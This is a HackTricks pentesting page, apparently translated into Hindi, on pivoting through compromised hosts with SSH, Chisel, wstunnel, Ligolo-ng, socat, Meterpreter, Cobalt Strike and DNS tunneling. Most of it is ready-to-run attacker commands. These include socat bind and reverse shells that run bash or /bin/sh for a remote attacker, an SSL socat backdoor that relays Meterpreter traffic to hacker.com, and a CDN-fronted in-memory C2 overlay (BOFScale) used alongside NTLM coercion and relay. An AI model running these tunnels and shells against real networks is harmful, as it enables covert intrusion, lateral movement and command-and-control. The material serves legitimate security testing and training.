# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap tip

> [!WARNING]
> Nmap का proxy support केवल TCP connections तक सीमित है और ping, port या OS-detection scans को प्रभावित नहीं करता। जब scanner किसी SOCKS proxy के पीछे हो, तो **host discovery को disable करें** (`-Pn`) और **TCP connect scan** (`-sT`) का उपयोग करें।<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

अंतिम command account और WinRM host की पहचान करने के लिए Evil-WinRM के `-u` और `-i` options का उपयोग करती है; इसका default WinRM port 5985 है।<sup>[[4]](#references)</sup>
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

OpenSSH encrypted channel के माध्यम से X11 connections, मनमाने TCP ports और Unix-domain sockets को forward कर सकता है।<sup>[[6]](#references)</sup>

SSH ग्राफिकल कनेक्शन (X)

`-Y` trusted X11 forwarding को सक्षम करता है और `-C` forwarded data के लिए compression का अनुरोध करता है।<sup>[[6]](#references)</sup>
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Remote Port2Port

SSH Server में नया Port खोलें --> Other port

Remote (`-R`) forwarding SSH server पर listen करता है और local side से connect होता है; explicit bind address यह नियंत्रित करता है कि कौन-से interfaces उस listener तक पहुँच सकते हैं।<sup>[[6]](#references)</sup>
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Local port --> Compromised host (SSH) --> Third_box:Port

Local (`-L`) forwarding client पर listen करता है और SSH server side से destination से connect करता है।<sup>[[6]](#references)</sup>
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Local Port --> Compromised host (SSH) --> Wherever

Dynamic (`-D`) forwarding एक local SOCKS4/SOCKS5 listener बनाता है, जिसके connections remote side से खोले जाते हैं।<sup>[[6]](#references)</sup>
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Multi-hop with ProxyJump

`-J`/`ProxyJump` एक या अधिक comma-separated jump hosts के माध्यम से target से connect करता है। Forwarding options अभी भी final SSH connection से संबंधित होते हैं, इसलिए नीचे दिया गया SOCKS listener पहले bastion से नहीं, बल्कि `internal-target` से destinations खोलता है। इससे jump host पर login करके वहां दूसरा SSH client शुरू करने की आवश्यकता नहीं होती।<sup>[[6]](#references)</sup>
```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```
Jump machines के लिए host-specific options को `~/.ssh/config` में रखा जाना चाहिए; destination के लिए intended command-line configuration intermediate hosts पर automatically लागू नहीं होती।<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

यह internal hosts से DMZ के माध्यम से आपके host पर reverse shells प्राप्त करने के लिए उपयोगी है:

Server की `GatewayPorts` setting यह नियंत्रित करती है कि remote forward loopback से आगे bind कर सकता है या नहीं; इसका default `no` है।<sup>[[7]](#references)</sup>
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

यह root-based example दोनों hosts पर tunnel devices बनाता है। Server को tun forwarding की अनुमति देनी चाहिए और selected account को tun device तक access होना चाहिए; यहां `PermitRootLogin yes` `root` account का उपयोग करने का एक तरीका है।<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Server side पर forwarding enable करें
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
क्लाइंट साइड पर एक नया route सेट करें
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**
> OpenSSH 9.6 ने Terrapin के early-transport integrity attack का मुकाबला करने के लिए strict-KEX extension जोड़ा। जहाँ संभव हो, दोनों peers को update करें और पुराने implementations के लिए vendor guidance का पालन करें; केवल version के आधार पर यह न मानें कि forwarded channel protected है।<sup>[[8]](#references)</sup>

## SSHUTTLE

आप किसी host के माध्यम से **ssh** द्वारा किसी **subnetwork** पर जाने वाले सभी **traffic** को **tunnel** कर सकते हैं।\
उदाहरण के लिए, 10.10.10.0/24 पर जाने वाले सभी traffic को forward करना।

`sshuttle` SSH के माध्यम से transparent proxying प्रदान करता है और नीचे दिखाए गए अनुसार subnets तथा custom SSH command चुनने का समर्थन करता है।<sup>[[9]](#references)</sup>
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Private key से connect करें
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

Metasploit का `portfwd` local और remote forwarding को support करता है, जबकि इसका SOCKS proxy module session routes या `autoroute` के साथ काम करने के लिए है और इन उदाहरणों में default रूप से port 1080 पर listen करता है।<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Local port --> Compromised host (active session) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
एक और तरीका:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

Cobalt Strike का Beacon, Beacon के माध्यम से SOCKS4a/SOCKS5 connections को relay कर सकता है; `rportfwd` compromised host पर bind करता है, जबकि `rportfwd_local` destination connection को Cobalt Strike client से initiate करता है।<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Team Server में उन interfaces पर एक port खोलें, जिन्हें Beacon के माध्यम से traffic route करना चाहिए।<sup>[[13]](#references)</sup>
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> इस मामले में, **port Beacon host में खोला जाता है**, Team Server में नहीं, और traffic Team Server को भेजा जाता है तथा वहाँ से निर्दिष्ट host:port पर भेजा जाता है।<sup>[[14]](#references)</sup>
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Reverse-forwarding manual में निम्न व्यवहार नोट किया गया है:<sup>[[14]](#references)</sup>

- Beacon का reverse port forward **traffic को Team Server तक tunnel करने के लिए डिज़ाइन किया गया है, individual machines के बीच relay करने के लिए नहीं**।
- Traffic को **Beacon के C2 traffic के भीतर tunnel किया जाता है**, जिसमें P2P links भी शामिल हैं।
- उच्च ports आमतौर पर privileged-port restrictions से बचते हैं, लेकिन target OS policy और मौजूदा listeners फिर भी लागू होते हैं।

### rPort2Port local

> [!WARNING]
> इस मामले में **port Beacon host में खोला जाता है**, Team Server में नहीं, और **traffic Cobalt Strike client को भेजा जाता है** (Team Server को नहीं), और वहां से indicated host:port पर भेजा जाता है।<sup>[[14]](#references)</sup>
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## BOFScale - CDN-fronted in-process tailnet

[BOFScale](https://github.com/NetSPI/BOFscale) किसी TUN driver या service को install किए बिना, Windows C2 implant के अंदर एक modified Tailscale overlay चलाता है। इसके तीन components हैं: एक asynchronous CGo `c-shared` `tailscaled` BOF-PE, local API से communicate करने वाला छोटा C++ BOF-PE, और asynchronous `socksportfwd` TCP-to-SOCKS5 bridge।<sup>[[53]](#references)[[54]](#references)</sup>

### CDN-compatible TS2021 and DERP

Tailscale सामान्यतः Noise-based TS2021 control channel और DERP relay के लिए proprietary HTTP upgrades का उपयोग करता है। BOFScale उन्हीं byte streams को RFC 6455 WebSockets में ले जाता है और `Sec-WebSocket-Protocol: ts2021` या `derp` का उपयोग करता है, ताकि operator-controlled Headscale/DERP origin ऐसे CDN के पीछे रह सके जो केवल standard WebSocket upgrades स्वीकार करता है। Patched client HTTP `500` के बाद TS2021 को WebSockets पर retry करता है, HTTP `426` के बाद DERP को retry करता है, और DERP WebSocket dialer को host proxy configuration का पालन करने देता है; BOF पहले प्रयास को skip करने के लिए `TS_DEBUG_DERP_WS_CLIENT=1` set करता है, जो ज्ञात रूप से fail होता है।<sup>[[53]](#references)[[54]](#references)</sup>

CDN और origin proxy को `/ts2021` और `/derp` के लिए WebSocket upgrades preserve करने चाहिए, `/key` को ordinary HTTP के रूप में forward करना चाहिए, और internal read/write timeouts disable करने चाहिए, क्योंकि relay sessions अनिश्चित समय तक खुले रह सकते हैं। दी गई Headscale configuration `verify_clients` enable करती है, केवल operator का embedded DERP map publish करती है, और Tailscale-operated relays पर fallback रोकने के लिए `derp.urls` को empty छोड़ती है।<sup>[[53]](#references)[[54]](#references)</sup>

### In-process daemon and named-pipe control

Override न किए जाने पर, BOF entry point `tailscaled` को `-tun=userspace-networking`, `-state mem:`, और `-no-logs-no-support` के साथ start करता है, फिर UUID-named pipe create करता है। यह Go stdout/stderr को OS pipe के माध्यम से Beacon output API पर redirect करता है, इसलिए पूरा daemon और Go runtime memory में resident रहते हैं, लेकिन state और logs किसी Tailscale directory में write नहीं किए जाते।<sup>[[53]](#references)[[54]](#references)</sup>

Lightweight client उस pipe पर Tailscale के HTTP/1.0 local API को reproduce करता है। यह pipe को `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION` के साथ open करता है, क्योंकि daemon की `safesocket` layer pipe client का impersonation करती है; `Tailscale-Cap: 125` भेजता है और local API को `up`, `down`, `status`, route advertisement, तथा shutdown operations पर map करता है।<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> Daemon को shutdown करने के लिए कहने के बाद manually mapped Go BOF-PE को unload न करें: runtime और garbage-collector goroutines उस memory से execution जारी रख सकते हैं जिसे loader unmap कर देता है। `tailscaled` को एक sacrificial process में चलाएं और final cleanup के लिए उस process को terminate करें।<sup>[[54]](#references)</sup>

### Bridge host-originated traffic through userspace SOCKS5

Inbound tailnet connections और advertised subnet routes userspace network stack के अंदर काम करते हैं, लेकिन compromised host पर चलने वाली normal processes के पास overlay में जाने के लिए कोई OS route नहीं होता। इसलिए `socksportfwd` victim-facing TCP port पर listen करता है, daemon के `0.0.0.0:1080` listener के साथ SOCKS5 `NO AUTH` negotiate करता है, tailnet destination के लिए `CONNECT` issue करता है, और दोनों दिशाओं में asynchronously relay करता है। जब target कोई MagicDNS name होता है, तो यह `ATYP_DOMAIN` का उपयोग करता है, जिससे `tailscaled` name को resolve करता है और वह Windows resolver के सामने expose नहीं होता।<sup>[[53]](#references)[[54]](#references)</sup>

नीचे एक minimal operator flow दिखाया गया है; operator node और implant दोनों को patched binaries का उपयोग करना होगा, क्योंकि stock Tailscale इस CDN design के माध्यम से traverse नहीं कर सकता।<sup>[[53]](#references)[[54]](#references)</sup>
```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```
The local forward, apparent authentication listener को relay tool से अलग कर सकता है: किसी machine को compromised host के bound port पर authenticate करने के लिए coerce करें, उसे tailnet के माध्यम से `ntlmrelayx` तक forward करें, और फिर AD CS, LDAP, HTTP, SMB या किसी अन्य compatible target पर relay करें। Vulnerability-specific stages के लिए [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) और [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8) देखें; BOFScale केवल transport है।<sup>[[54]](#references)</sup>

### Detection

किसी एक कमजोर indicator के बजाय इनके combination की तलाश करें: ऐसे process में Go runtime जो सामान्यतः Go-based नहीं होता, permissive SDDL `D:(A;;GA;;;WD)` वाली UUID pipe, अनपेक्षित `0.0.0.0:1080` SOCKS listener, और CDN addresses से आने वाले long-lived TLS WebSockets। TLS inspection के साथ, `Sec-WebSocket-Protocol: derp` या `ts2021` को flag करें, जब owning process authorized `tailscaled` service न हो। Repository के `bofscale.yar` rules, सभी तीन BOF-PE components के लिए memory signatures प्रदान करते हैं।<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

यह project `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` और `tunnel.php` जैसे web tunnel endpoints उपलब्ध कराता है; local proxy शुरू करने से पहले किसी एक supported endpoint को upload करें।<sup>[[15]](#references)</sup>
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

आप इसे [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) के releases page से download कर सकते हैं।\
Chisel SSH-protected connection का उपयोग करके HTTP के माध्यम से TCP/UDP traffic ले जाता है; compatible client/server builds का उपयोग करें और selected release के command syntax को verify करें।<sup>[[16]](#references)</sup>

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) static या dynamic forwards को WebSocket, HTTP/2, या WebTransport (HTTP/3 over QUIC) के माध्यम से ले जाता है। Current builds TCP, UDP, Unix sockets, stdio, SOCKS5, HTTP proxying और Linux transparent-proxy listeners को forward और reverse दोनों modes में support करते हैं।<sup>[[52]](#references)</sup>

### Reverse SOCKS5 pivot

Attacker पर server चलाएँ और `-R` के साथ pivot को outbound connect करने दें। इस दिशा में SOCKS5 listener **server** पर बनाया जाता है, जबकि requested connections **client/pivot** network से originate होते हैं।<sup>[[52]](#references)</sup>
```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
-R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```
एक reverse static forward उसी दिशा का उपयोग करता है। उदाहरण के लिए, निम्नलिखित pivot द्वारा पहुँच योग्य `10.10.10.20:445` को attacker के loopback port `8445` पर expose करता है:<sup>[[52]](#references)</sup>
```bash
wstunnel client --tls-verify-certificate \
-R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```
### Egress और transport विवरण

- किसी explicit HTTP proxy को पार करने के लिए client में `-p http://user:pass@proxy:8080` जोड़ें। `curl` जैसे clients में `socks5h://127.0.0.1:1080` का उपयोग करें (या application में proxied DNS enable करें), ताकि internal names tunnel से आगे resolve हों और local resolver तक leak न हों।<sup>[[52]](#references)</sup>
- `wss://` TLS-protected WebSocket चुनता है। `https://` client HTTP/2 चुनता है, लेकिन reverse proxies/CDNs द्वारा buffering या HTTP/1 conversion bidirectional stream को सामान्यतः तोड़ देता है; इस mode को test करते समय wstunnel server को सीधे expose करें।<sup>[[52]](#references)</sup>
- `wts://` WebTransport over QUIC चुनता है। Server को `--enable-webtransport` (या `wts://` listen URL) के साथ start करें और listening port पर UDP allow करें। यह mode conventional HTTP `CONNECT` proxy से traverse नहीं कर सकता, क्योंकि वह proxy TCP carry करता है।<sup>[[52]](#references)</sup>

> [!WARNING]
> Upstream project चेतावनी देता है कि इसके embedded self-signed certificate को privacy protection न मानें। Valid custom certificate के साथ `--tls-verify-certificate` (या mTLS) को प्राथमिकता दें, proxy listeners को loopback पर रखें जब तक remote access जानबूझकर आवश्यक न हो, और confidentiality महत्वपूर्ण होने पर पहले से secure protocols को tunnel करें।<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Ligolo-ng quickstart proxy पर TUN interface, agent के लिए certificate-fingerprint validation, और tunneled network के लिए route setup का documentation देता है।<sup>[[17]](#references)</sup>

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent Binding और Listening

Ligolo-ng agent पर ऐसे listeners जोड़ सकता है जो traffic को proxy-side address पर forward करते हैं, और इसकी reserved `240.0.0.0/4` range को route करके agent-local services तक पहुँचा जा सकता है।<sup>[[18]](#references)[[19]](#references)</sup>
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Agent के Local Ports तक Access
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot victim से reverse tunnel शुरू करता है और attacker के loopback address पर SOCKS4 proxy expose करता है; इसके README में NTLM-proxy credentials और hash options भी documented हैं।<sup>[[20]](#references)</sup>
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
NTLM proxy के माध्यम से **Pivot** करें
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` और `PROXY` जैसे address types को संयोजित करता है; नीचे दिए गए उदाहरण उन documented endpoints को मिलाते हैं।<sup>[[21]](#references)</sup>

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### socks के माध्यम से Port2Port
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### SSL Socat के माध्यम से Meterpreter
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
आप socat के documented `PROXY` address type का उपयोग करके एक **non-authenticated proxy** को traverse कर सकते हैं। इसके लिए victim के console में अंतिम वाली line के बजाय यह line execute करें।<sup>[[21]](#references)</sup>
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

दोनों sides पर certificates बनाएँ: Client और Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

स्थानीय SSH port (22) को attacker host के 443 port से connect करें
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Plink, PuTTY का command-line connection tool है, जिसमें `ssh` के समान SSH forwarding options होते हैं।<sup>[[22]](#references)</sup>

SSH port के लिए uppercase `-P` का उपयोग करें। `-pw` compatibility के लिए रखा गया है, लेकिन यह process list में password दिखाता है; जहाँ संभव हो, key authentication या `-pwfile` को प्राथमिकता दें।<sup>[[22]](#references)[[23]](#references)</sup>

चूँकि यह binary victim पर execute होगी और यह एक SSH client है, reverse connection के लिए SSH service और port खोलें; निम्न उदाहरण `-R` का उपयोग करके locally accessible port को attacker's machine पर forward करता है।<sup>[[22]](#references)</sup>
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

स्थायी `portproxy` rules बनाते या बदलते समय host के लिए आवश्यक permissions वाले context का उपयोग करें। Microsoft नीचे उपयोग किए गए `v4tov4` add, show और delete forms को document करता है।<sup>[[24]](#references)</sup>
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

आपके पास **system पर RDP access** होना चाहिए।\
Download:

SocksOverRDP, मौजूदा RDP session पर SOCKS5 connection को ले जाने के लिए Remote Desktop Dynamic Virtual Channels का उपयोग करता है; client plugin `127.0.0.1:1080` पर listen करता है, जबकि server component RDP target पर चलता है।<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - यह tool Windows के Remote Desktop Service feature से `Dynamic Virtual Channels` (`DVC`) का उपयोग करता है। DVC, **RDP connection पर packets को tunnel करने** के लिए जिम्मेदार है।
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

अपने client computer में **`SocksOverRDP-Plugin.dll`** को इस तरह load करें:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
अब हम **`mstsc.exe`** का उपयोग करके **RDP** के माध्यम से **victim** से **connect** कर सकते हैं, और हमें एक **prompt** प्राप्त होना चाहिए जिसमें बताया जाएगा कि **SocksOverRDP plugin** enabled है और यह **127.0.0.1:1080** पर **listen** करेगा।

**RDP** के माध्यम से **connect** करें और victim machine में `SocksOverRDP-Server.exe` binary को upload एवं execute करें:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
अब अपनी machine (attacker) पर पुष्टि करें कि port 1080 listening है:
```
netstat -antb | findstr 1080
```
अब आप उस port के माध्यम से traffic को proxy करने के लिए [**Proxifier**](https://www.proxifier.com/) का उपयोग कर सकते हैं।<sup>[[26]](#references)</sup>

## Proxify Windows GUI Apps

आप [**Proxifier**](https://www.proxifier.com/) का उपयोग करके Windows GUI apps को proxy के माध्यम से navigate करा सकते हैं।<sup>[[26]](#references)</sup>\
**Profile -> Proxy Servers** में SOCKS server का IP और port जोड़ें।\
**Profile -> Proxification Rules** में proxify किए जाने वाले program का नाम और उन IPs के connections जोड़ें जिन्हें आप proxify करना चाहते हैं; Proxifier rules applications, target hosts और ports से match कर सकते हैं।<sup>[[27]](#references)</sup>

## NTLM proxy के माध्यम से Tunnel

पहले बताए गए tool, **Rpivot**, NTLM-authenticating proxy के माध्यम से relay कर सकते हैं। **OpenVPN** भी auth file और NTLMv2 method के साथ configured होने पर इसके माध्यम से route कर सकता है; यह proxy traversal है, proxy authentication का bypass नहीं।<sup>[[20]](#references)[[28]](#references)</sup>
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm upstream NTLM proxies के साथ authenticate करता है, local listeners को expose करता है, और एक local tunnel port को destination service से map कर सकता है; इसके बाद clients उस local port का उपयोग कर सकते हैं।<sup>[[29]](#references)</sup>\
उदाहरण के लिए, port 443 को forward करें.
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
अब, यदि आप उदाहरण के लिए victim में **SSH** service को port 443 पर listen करने के लिए सेट करते हैं, तो आप attacker के port 2222 के माध्यम से उससे connect कर सकते हैं।<sup>[[29]](#references)</sup>\
आप ऐसा **meterpreter** भी उपयोग कर सकते हैं जो localhost:443 से connect होता है, जबकि attacker port 2222 पर listen करता है।<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) Microsoft का .NET reverse-proxy toolkit है। आप इसे यहाँ पा सकते हैं: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)।<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine DNS queries के माध्यम से एक IPv4 tunnel बनाता है और TUN interfaces का उपयोग करता है; documented setup के लिए दोनों ends पर उन interfaces को create करने के लिए आवश्यक privileges चाहिए।<sup>[[31]](#references)</sup>
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
DNS transport में direct TCP की तुलना में अधिक overhead होता है और यह आमतौर पर धीमा होता है; आप इस tunnel के माध्यम से निम्नलिखित का उपयोग करके एक compressed SSH connection बना सकते हैं:<sup>[[31]](#references)</sup>
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

